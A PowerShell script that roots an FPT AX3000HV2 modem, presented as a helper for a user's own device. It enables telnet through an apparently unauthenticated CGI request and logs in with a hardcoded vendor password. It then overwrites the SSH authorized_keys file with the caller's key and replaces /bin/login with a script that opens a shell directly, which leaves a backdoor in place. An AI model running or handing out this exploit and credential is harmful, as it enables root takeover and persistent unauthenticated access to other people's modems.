<#
.SYNOPSIS
    Root shell helper for FPT AX3000HV2 modem (personal device use only)
.PARAMETER ModemIP
    Modem IP address (default: 192.168.1.1)
.PARAMETER PubKeyPath
    Path to SSH public key to inject (optional)
#>
param(
    [string]$ModemIP = "192.168.1.1",
    [string]$PubKeyPath = ""
)

$TelnetUser = "admin"
$TelnetPass = "hbmt@_fpt"

# Step 1: Enable telnet via unauthenticated CGI
Write-Host "[*] Enabling telnet on $ModemIP..." -ForegroundColor Cyan
curl.exe -s "http://$ModemIP/cgi-bin/telnetenable.cgi?telnetenable=1" | Out-Null
Write-Host "[+] Telnet enable request sent." -ForegroundColor Green

# Step 2: If a public key path is provided, inject it via telnet using Python-style raw socket (via PowerShell TCP)
if ($PubKeyPath -ne "" -and (Test-Path $PubKeyPath)) {
    $pubKey = Get-Content $PubKeyPath -Raw
    $pubKey = $pubKey.Trim()

    Write-Host "[*] Injecting SSH public key via telnet..." -ForegroundColor Cyan

    $client = New-Object System.Net.Sockets.TcpClient($ModemIP, 23)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    function Read-Telnet($ms = 2000) {
        Start-Sleep -Milliseconds $ms
        $buf = New-Object byte[] 4096
        if ($stream.DataAvailable) {
            $n = $stream.Read($buf, 0, $buf.Length)
            return [System.Text.Encoding]::ASCII.GetString($buf, 0, $n)
        }
        return ""
    }

    Read-Telnet 2000 | Out-Null  # banner

    $writer.Write("$TelnetUser`r`n")
    Read-Telnet 1000 | Out-Null

    $writer.Write("$TelnetPass`r`n")
    Read-Telnet 2000 | Out-Null  # shell prompt

    # Inject public key
    $cmd = "echo '$pubKey' > /etc/dropbear/authorized_keys`r`n"
    $writer.Write($cmd)
    Read-Telnet 1000 | Out-Null

    # Patch /bin/login to bypass busybox login loop
    $writer.Write("rm /bin/login`r`n"); Read-Telnet 500 | Out-Null
    $writer.Write("printf '#!/bin/sh\nexec /bin/sh -l\n' > /bin/login`r`n"); Read-Telnet 500 | Out-Null
    $writer.Write("chmod +x /bin/login`r`n"); Read-Telnet 500 | Out-Null

    # Verify
    $writer.Write("cat /etc/dropbear/authorized_keys`r`n")
    $result = Read-Telnet 1000
    Write-Host "[+] authorized_keys content:`n$result" -ForegroundColor Green

    $client.Close()
    Write-Host "[+] Key injected and /bin/login patched." -ForegroundColor Green
    Write-Host "[*] Now SSH with: ssh -i <private_key> admin@$ModemIP" -ForegroundColor Yellow

} else {
    # Just open interactive telnet session
    Write-Host "[*] Opening interactive telnet session..." -ForegroundColor Cyan
    Write-Host "    Login:    $TelnetUser" -ForegroundColor DarkGray
    Write-Host "    Password: $TelnetPass" -ForegroundColor DarkGray
    & telnet.exe $ModemIP
}